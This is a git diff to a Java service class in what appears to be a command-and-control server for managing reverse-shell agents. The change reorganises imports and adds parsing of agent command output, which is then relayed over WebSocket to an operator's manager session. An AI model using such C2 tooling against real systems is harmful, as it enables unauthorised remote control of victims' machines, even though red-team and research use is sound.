@@ -1,8 +1,10 @@
 package com.mtattab.c2cServer.service.impl.shell.management;
 
-import com.mtattab.c2cServer.model.json.InitialConnectionMessageModel;
-import com.mtattab.c2cServer.model.json.ManagerCommunicationModel;
-import com.mtattab.c2cServer.model.json.ReverseShellInfoInitialMessage;
+import com.mtattab.c2cServer.model.json.RestOutputModel;
+import com.mtattab.c2cServer.model.json.shell.AgentCommandRestOutputModel;
+import com.mtattab.c2cServer.model.json.shell.InitialConnectionMessageModel;
+import com.mtattab.c2cServer.model.json.shell.ManagerCommunicationModel;
+import com.mtattab.c2cServer.model.json.shell.ReverseShellInfoInitialMessage;
 import com.mtattab.c2cServer.model.entity.SessionLogEntity;
 import com.mtattab.c2cServer.repository.SessionLogRepository;
 import com.mtattab.c2cServer.service.ReverseShellClientHandlerService;
@@ -105,13 +107,23 @@ public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientH
         String clientMessage = message.getPayload();
 //        ManagerCommunicationModel managerCommunicationModel= DataManipulationUtil.jsonToObject(clientMessage, ManagerCommunicationModel.class);
 
+
+
         // Handle the client's message (e.g., send a response back to the client)
         String responseMessage =  clientMessage;
         System.out.println(responseMessage);
 
+
+
+
         WebSocketSession mangerSession = ConnectionManager.connectedReverseToManagerSessions.get(session);
         if (mangerSession!=null){
 
+            AgentCommandRestOutputModel agentCommandRestOutputModel = DataManipulationUtil.
+                    jsonToObject(message.getPayload(), AgentCommandRestOutputModel.class);
+            if (agentCommandRestOutputModel!=null){
+                responseMessage = agentCommandRestOutputModel.getOutput();
+            }
 
             SocketUtil.sendMessage(mangerSession, new TextMessage(
                     DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
